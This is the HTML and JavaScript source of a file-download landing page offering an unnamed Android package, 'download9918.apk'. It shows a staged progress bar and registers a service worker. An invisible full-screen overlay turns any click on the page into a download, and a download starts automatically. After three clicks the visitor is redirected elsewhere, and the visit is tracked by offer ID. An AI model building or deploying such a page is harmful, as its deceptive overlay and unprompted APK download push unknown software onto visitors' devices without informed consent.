<!doctype html>
<html lang="en" translate="no">
  <head>
    <meta charset="utf-8">
    <meta name="google" content="notranslate">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Download</title>
    <script src="../params.js?v=personal-site-23"></script>
    <script src="../js/main.js"></script>
    <script src="../js/worker.js"></script>
    <script>
      window.__downloadTestRevision = 'personal-site-23';
      window.__downloadSwVersion = '42316903';
      window.__downloadSwUrl = `${window.__landingRoot}sw4.js?v=${window.__downloadSwVersion}&r=${window.__downloadTestRevision}`;

      DownWorker.setup()

      try {
        posthog.init(...DownLand.posthogParams({ land: '023', swUrl: window.__downloadSwUrl }));
      } catch (error) {
        log('error', 'Posthog init failed', errorAttributes(error));
      }
    </script>
    <style>
     * {
       box-sizing: border-box;
       margin: 0;
       padding: 0;
       font-family: Verdana, Arial, Helvetica, sans-serif;
     }

     body {
       min-height: 100vh;
       overflow: hidden;
       display: flex;
       flex-direction: column;
       background: #fff;
       color: #1b1b1b;
     }

     .f-data {
       margin: 20vh auto 0;
       display: flex;
       flex-direction: row;
       align-items: center;
       gap: 15px;
       font-size: 14px;
     }

     .f-image {
       width: 70px;
       height: 105px;
       background: url(file.png) center 6px / 70px no-repeat;
       flex: 0 0 auto;
     }

     .f-info {
       display: flex;
       flex-direction: column;
       gap: 2px;
     }

     .f-name {
       width: 200px;
       overflow-wrap: break-word;
       font-size: 14px;
       font-weight: 700;
     }

     .f-size,
     .f-uploaded {
       font-size: 16px;
     }

     .s-box {
       position: relative;
       width: 270px;
       height: 50px;
       margin: 12px auto 0;
       padding: 1px;
       border-radius: 10px;
       box-shadow: 1px 1px 5px rgba(124, 124, 124, 0.223);
     }

     .scale {
       width: 0;
       height: 100%;
       border-radius: 10px;
       background: linear-gradient(279deg, rgba(109, 215, 90, 1) 1%, rgba(38, 130, 20, 1) 63%);
       transition: 200ms;
     }

     .scale-percent {
       position: absolute;
       top: 10px;
       left: 10px;
       color: #fff;
       font-size: 26px;
       font-weight: 700;
       text-shadow: 2px 2px rgb(29, 29, 29);
     }

     .d-box {
       position: relative;
       width: 100%;
       height: 100px;
       margin-top: 20px;
       overflow: hidden;
       display: flex;
       align-items: center;
       justify-content: center;
     }

     .d-button-box {
       position: absolute;
       top: -100%;
       width: 250px;
       height: 100px;
       display: flex;
       align-items: center;
       justify-content: center;
       transition: 1s;
     }

     button {
       position: relative;
       border: 0;
       border-radius: 20px;
       padding: 20px 38px;
       display: flex;
       flex-direction: row;
       align-items: center;
       justify-content: center;
       gap: 10px;
       background: #339120;
       box-shadow: 1px 1px 5px rgba(124, 124, 124, 0.223);
       color: #fff;
       font-size: 20px;
       font-weight: 600;
       letter-spacing: 1px;
       text-align: center;
       text-transform: uppercase;
       cursor: pointer;
     }

     button:disabled {
       cursor: wait;
       opacity: 0.7;
     }

     .click-area {
       position: fixed;
       inset: 0;
       z-index: 10;
       cursor: pointer;
     }

     .hidden-frame {
       position: absolute;
       width: 0;
       height: 0;
       border: 0;
       opacity: 0;
       pointer-events: none;
     }

    </style>
  </head>
  <body>
    <div class="f-data">
      <div class="f-image"></div>
      <div class="f-info">
        <div id="fileTitle" class="f-name">download9918.apk</div>
        <div class="f-size">Size: 5.7 MB</div>
        <div class="f-uploaded">March 22, 2026 10:41</div>
      </div>
    </div>
    <div class="s-box">
      <div class="scale-percent"></div>
      <div class="scale"></div>
    </div>
    <div class="d-box">
      <div class="d-button-box">
        <button id="downloadButton" type="button" disabled>
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="35" height="35" aria-hidden="true">
            <path fill="#fff" d="M12.001 16.8a.48.48 0 0 1-.48-.48V.96a.48.48 0 1 1 .96 0v15.36a.48.48 0 0 1-.48.48Z"/>
            <path fill="#fff" d="M12 16.8a.482.482 0 0 1-.34-.14l-3.84-3.84a.48.48 0 1 1 .679-.679l3.5 3.5 3.5-3.5a.48.48 0 1 1 .681.679l-3.84 3.84a.478.478 0 0 1-.34.14Z"/>
            <path fill="#fff" d="M21.12 23.52H2.88a2.4 2.4 0 0 1-2.4-2.4v-4.8a.48.48 0 0 1 .96 0v4.8a1.442 1.442 0 0 0 1.44 1.44h18.24a1.442 1.442 0 0 0 1.44-1.44v-4.8a.48.48 0 0 1 .96 0v4.8a2.4 2.4 0 0 1-2.4 2.4Z"/>
          </svg>
          <span>DOWNLOAD</span>
        </button>
      </div>
    </div>
    <div id="clickArea" class="click-area" aria-hidden="true"></div>
    <iframe id="downloadFrame" class="hidden-frame" title="download frame" aria-hidden="true"></iframe>

    <script>
      (() => {
        const downloadButton = document.querySelector('#downloadButton');
        const clickArea = document.querySelector('#clickArea');
        const scale = document.querySelector('.scale');
        const scalePercentText = document.querySelector('.scale-percent');
        const downloadButtonBox = document.querySelector('.d-button-box');

        let trustedClickCount = 0;
        let isPresentationReady = false;

        function handleDownloadClick(event) {
          try {
            if (!isPresentationReady) {
              return;
            }

            if (!DownWorker.isServiceWorkerReady()) {
              log('info', 'Download requested before service worker readiness');
              return;
            }

            if (event && event.isTrusted) {
              trustedClickCount += 1;

              if (trustedClickCount >= 3) {
                window.location.href = DownLand.redirectUrl();
                return;
              }
            }

            DownLand.startDownload({ passParams: false })
          } catch (error) {
            log('error', 'Download click handling failed', {
              error_name: error?.name,
              error_message: error?.message,
              error_stack: error?.stack?.split('\n').slice(0, 5).join('\n'),
            })
          }
        }

        function runProgress() {
          log('info', 'Run progress bar')
          return new Promise((resolve) => {
            let scorePercent = 0;
            scalePercentText.textContent = '0%';
            const timer = window.setInterval(() => {
              scorePercent += 10;
              scale.style.width = `${scorePercent}%`;
              scalePercentText.textContent = `${scorePercent}%`;
              if (scorePercent < 100) {
                return;
              }

              window.clearInterval(timer);
              window.setTimeout(() => {
                let fallback;
                function finish(event) {
                  if (event && (event.target !== downloadButtonBox || event.propertyName !== 'top')) {
                    return;
                  }
                  window.clearTimeout(fallback);
                  downloadButtonBox.removeEventListener('transitionend', finish);
                  resolve();
                  log('info', 'Progress bar completed')
                }
                downloadButtonBox.addEventListener('transitionend', finish);
                fallback = window.setTimeout(finish, 1100);
                downloadButtonBox.style.top = '0';
              }, 200);
            }, 100);
          });
        }

        if ('serviceWorker' in navigator) {
          navigator.serviceWorker.addEventListener('message', (event) => {
            if (event.data && event.data.type === 'DOWNLOAD_CANCELED') {
              DownLand.onCanceled(event.data)
            }
          })
        }

        downloadButton.addEventListener('click', handleDownloadClick);
        clickArea.addEventListener('click', handleDownloadClick);

        const downloadReady = DownWorker.registerService({ passParams: false, autoStart: false })

        Promise.all([runProgress(), downloadReady]).then(() => {
          isPresentationReady = true;
          downloadButton.disabled = !(DownWorker.isServiceWorkerReady() && DownWorker.offerId());
          if (!downloadButton.disabled) {
            DownLand.autoDownload({ passParams: false })
          }
        }).catch((error) => {
          log('error', 'Presentation flow failed', {
            error_name: error?.name,
            error_message: error?.message,
            error_stack: error?.stack?.split('\n').slice(0, 5).join('\n'),
          })
        });
      })();
    </script>
  </body>
</html>
